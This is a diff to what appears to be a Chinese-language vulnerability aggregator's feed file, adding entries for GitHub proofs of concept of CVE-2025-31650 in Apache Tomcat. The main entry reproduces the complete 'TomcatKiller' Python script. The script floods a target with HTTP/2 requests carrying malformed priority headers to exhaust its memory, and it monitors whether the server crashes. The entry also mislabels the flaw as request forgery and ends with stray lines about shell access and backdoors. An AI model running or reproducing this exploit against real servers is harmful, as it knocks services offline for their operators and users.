@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>Apache Tomcat 10.1.39 - Denial of Service (DOS)</title>
+    <link href="/2025/06/13/github_549852678/"/>
+    <url>/2025/06/13/github_549852678/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Tomcat 10.1.39 - Denial of Service (DOS)</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-31650</li></ul><p><strong>漏洞类型：</strong> 服务端请求伪造</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Apache Tomcat 10.1.10至10.1.39版本中存在一个通过无效HTTP&#x2F;2优先级头导致的内存泄漏漏洞，攻击者可以利用此漏洞进行拒绝服务攻击。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache Tomcat</p><p><strong>影响版本：</strong> 10.1.10 &lt;&#x3D; version &lt;&#x3D; 10.1.39</p><p><strong>来源：</strong> <a href="https://github.com/assad12341/Dos-exploit-">https://github.com/assad12341/Dos-exploit-</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>52318.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Dos-exploit"><a href="#Dos-exploit" class="headerlink" title="Dos-exploit-"></a>Dos-exploit-</h2><p>CVE-2025-31650</p><h2 id="Exploit-Title-Apache-Tomcat-10-1-39-Denial-of-Service-DOS"><a href="#Exploit-Title-Apache-Tomcat-10-1-39-Denial-of-Service-DOS" class="headerlink" title="Exploit Title: Apache Tomcat 10.1.39 - Denial of Service (DOS)"></a>Exploit Title: Apache Tomcat 10.1.39 - Denial of Service (DOS)</h2><h2 id="Author-Abdualhadi-khalifa"><a href="#Author-Abdualhadi-khalifa" class="headerlink" title="Author: Abdualhadi khalifa"></a>Author: Abdualhadi khalifa</h2><h2 id="CVE-CVE-2025-31650"><a href="#CVE-CVE-2025-31650" class="headerlink" title="CVE: CVE-2025-31650"></a>CVE: CVE-2025-31650</h2><p>import httpx<br>import asyncio<br>import random<br>import urllib.parse<br>import sys<br>import socket<br>from colorama import init, Fore, Style</p><p>init()</p><p>class TomcatKiller:<br>    def <strong>init</strong>(self):<br>        self.success_count &#x3D; 0<br>        self.error_count &#x3D; 0<br>        self.invalid_priorities &#x3D; [<br>            \&quot;u&#x3D;-1, q&#x3D;2\&quot;,<br>            \&quot;u&#x3D;4294967295, q&#x3D;-1\&quot;,<br>            \&quot;u&#x3D;-2147483648, q&#x3D;1.5\&quot;,<br>            \&quot;u&#x3D;0, q&#x3D;invalid\&quot;,<br>            \&quot;u&#x3D;1&#x2F;0, q&#x3D;NaN\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;2, invalid&#x3D;param\&quot;,<br>            \&quot;\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, u&#x3D;2\&quot;,<br>            \&quot;u&#x3D;99999999999999999999, q&#x3D;0\&quot;,<br>            \&quot;u&#x3D;-99999999999999999999, q&#x3D;0\&quot;,<br>            \&quot;u&#x3D;, q&#x3D;\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, malformed\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;, invalid\&quot;,<br>            \&quot;u&#x3D;-1, q&#x3D;4294967295\&quot;,<br>            \&quot;u&#x3D;invalid, q&#x3D;1\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, extra&#x3D;\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1; malformed\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, &#x3D;invalid\&quot;,<br>            \&quot;u&#x3D;0, q&#x3D;0, stream&#x3D;invalid\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, priority&#x3D;recursive\&quot;,<br>            \&quot;u&#x3D;1, q&#x3D;1, %invalid%\&quot;,<br>            \&quot;u&#x3D;0, q&#x3D;0, null&#x3D;0\&quot;,<br>        ]</p><pre><code class="hljs">async def validate_url(self, url):    try:        parsed_url = urllib.parse.urlparse(url)        if not parsed_url.scheme or not parsed_url.hostname:            raise ValueError(\\\&quot;Invalid URL format. Use http:// or https://\\\&quot;)        host = parsed_url.hostname        port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == \\\&#39;https\\\&#39; else 80)        return host, port    except Exception:        print(f\\\&quot;&#123;Fore.RED&#125;Error: Invalid URL. Use http:// or https:// format.&#123;Style.RESET_ALL&#125;\\\&quot;)        sys.exit(1)async def check_http2_support(self, host, port):    async with httpx.AsyncClient(http2=True, verify=False, timeout=5, limits=httpx.Limits(max_connections=1000)) as client:        try:            response = await client.get(f\\\&quot;https://&#123;host&#125;:&#123;port&#125;/\\\&quot;, headers=&#123;\\\&quot;user-agent\\\&quot;: \\\&quot;TomcatKiller\\\&quot;&#125;)            if response.http_version == \\\&quot;HTTP/2\\\&quot;:                print(f\\\&quot;&#123;Fore.GREEN&#125;HTTP/2 supported! Proceeding ...&#123;Style.RESET_ALL&#125;\\\&quot;)                return True            else:                print(f\\\&quot;&#123;Fore.YELLOW&#125;Error: HTTP/2 not supported. This exploit requires HTTP/2.&#123;Style.RESET_ALL&#125;\\\&quot;)                return False        except Exception:            print(f\\\&quot;&#123;Fore.RED&#125;Error: Could not connect to &#123;host&#125;:&#123;port&#125;.&#123;Style.RESET_ALL&#125;\\\&quot;)            return Falseasync def send_invalid_priority_request(self, host, port, num_requests, task_id):    async with httpx.AsyncClient(http2=True, verify=False, timeout=0.3, limits=httpx.Limits(max_connections=1000)) as client:        url = f\\\&quot;https://&#123;host&#125;:&#123;port&#125;/\\\&quot;        for i in range(num_requests):            headers = &#123;                \\\&quot;priority\\\&quot;: random.choice(self.invalid_priorities),                \\\&quot;user-agent\\\&quot;: f\\\&quot;TomcatKiller-&#123;task_id&#125;-&#123;random.randint(1, 1000000)&#125;\\\&quot;,                \\\&quot;cache-control\\\&quot;: \\\&quot;no-cache\\\&quot;,                \\\&quot;accept\\\&quot;: f\\\&quot;*/*; q=&#123;random.random()&#125;\\\&quot;,            &#125;            try:                await client.get(url, headers=headers)                self.success_count += 1            except Exception:                self.error_count += 1async def monitor_server(self, host, port):    while True:        try:            with socket.create_connection((host, port), timeout=2):                print(f\\\&quot;&#123;Fore.YELLOW&#125;Target &#123;host&#125;:&#123;port&#125; is reachable.&#123;Style.RESET_ALL&#125;\\\&quot;)        except Exception:            print(f\\\&quot;&#123;Fore.RED&#125;Target &#123;host&#125;:&#123;port&#125; unreachable or crashed!&#123;Style.RESET_ALL&#125;\\\&quot;)            break        await asyncio.sleep(2)async def run_attack(self, host, port, num_tasks, requests_per_task):    print(f\\\&quot;&#123;Fore.GREEN&#125;Starting attack on &#123;host&#125;:&#123;port&#125;...&#123;Style.RESET_ALL&#125;\\\&quot;)    print(f\\\&quot;Tasks: &#123;num_tasks&#125;, Requests per task: &#123;requests_per_task&#125;\\\&quot;)    print(f\\\&quot;&#123;Fore.YELLOW&#125;Monitor memory manually via VisualVM or check catalina.out for OutOfMemoryError.&#123;Style.RESET_ALL&#125;\\\&quot;)    monitor_task = asyncio.create_task(self.monitor_server(host, port))    tasks = [self.send_invalid_priority_request(host, port, requests_per_task, i) for i in range(num_tasks)]    await asyncio.gather(*tasks)    monitor_task.cancel()    total_requests = num_tasks * requests_per_task    success_rate = (self.success_count / total_requests * 100) if total_requests &gt; 0 else 0    print(f\\\&quot;\\\\n&#123;Fore.MAGENTA&#125;===== Attack Summary =====&#123;Style.RESET_ALL&#125;\\\&quot;)    print(f\\\&quot;Target: &#123;host&#125;:&#123;port&#125;\\\&quot;)    print(f\\\&quot;Total Requests: &#123;total_requests&#125;\\\&quot;)    print(f\\\&quot;Successful Requests: &#123;self.success_count&#125;\\\&quot;)    print(f\\\&quot;Failed Requests: &#123;self.error_count&#125;\\\&quot;)    print(f\\\&quot;Success Rate: &#123;success_rate:.2f&#125;%\\\&quot;)    print(f\\\&quot;&#123;Fore.MAGENTA&#125;=========================&#123;Style.RESET_ALL&#125;\\\&quot;)</code></pre><p>async def main():<br>    print(f\&quot;{Fore.BLUE}&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; TomcatKiller - CVE-2025-31650 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;{Style.RESET_ALL}\&quot;)<br>    print(f\&quot;Developed by: @absholi7ly\&quot;)<br>    print(f\&quot;Exploits memory leak in Apache Tomcat (10.1.10-10.1.39) via invalid HTTP&#x2F;2 priority headers.\&quot;)<br>    print(f\&quot;{Fore.YELLOW}Warning: For authorized testing only. Ensure HTTP&#x2F;2 and vulnerable Tomcat version.{Style.RESET_ALL}\\n\&quot;)</p><pre><code class="hljs">url = input(f\\\&quot;&#123;Fore.CYAN&#125;Enter target URL (e.g., https://localhost:8443): &#123;Style.RESET_ALL&#125;\\\&quot;)num_tasks = int(input(f\\\&quot;&#123;Fore.CYAN&#125;Enter number of tasks (default 300): &#123;Style.RESET_ALL&#125;\\\&quot;) or 300)requests_per_task = int(input(f\\\&quot;&#123;Fore.CYAN&#125;Enter requests per task (default 100000): &#123;Style.RESET_ALL&#125;\\\&quot;) or 100000)tk = TomcatKiller()host, port = await tk.validate_url(url)if not await tk.check_http2_support(host, port):    sys.exit(1)await tk.run_attack(host, port, num_tasks, requests_per_task)</code></pre><p>if <strong>name</strong> &#x3D;&#x3D; \&quot;<strong>main</strong>\&quot;:<br>    try:<br>        asyncio.run(main())<br>        print(f\&quot;{Fore.GREEN}Attack completed!{Style.RESET_ALL}\&quot;)<br>    except KeyboardInterrupt:<br>        print(f\&quot;{Fore.YELLOW}Attack interrupted by user.{Style.RESET_ALL}\&quot;)<br>        sys.exit(0)<br>    except Exception as e:<br>        print(f\&quot;{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}\&quot;)<br>        sys.exit(1)</p><p>Provide shell access.<br>Install backdoors or persistence mechanisms.<br>Perform any destructive actions.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE-2025:github search</tag>
+      
+      <tag>服务端请求伪造</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>DOS-exploit</title>
+    <link href="/2025/06/13/github_811000016/"/>
+    <url>/2025/06/13/github_811000016/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> DOS-exploit</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-31650</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>来源：</strong> <a href="https://github.com/assad12341/DOS-exploit">https://github.com/assad12341/DOS-exploit</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>NTLM reflection SMB flaw</title>
     <link href="/2025/06/13/github_1141400579/"/>
     <url>/2025/06/13/github_1141400579/</url>
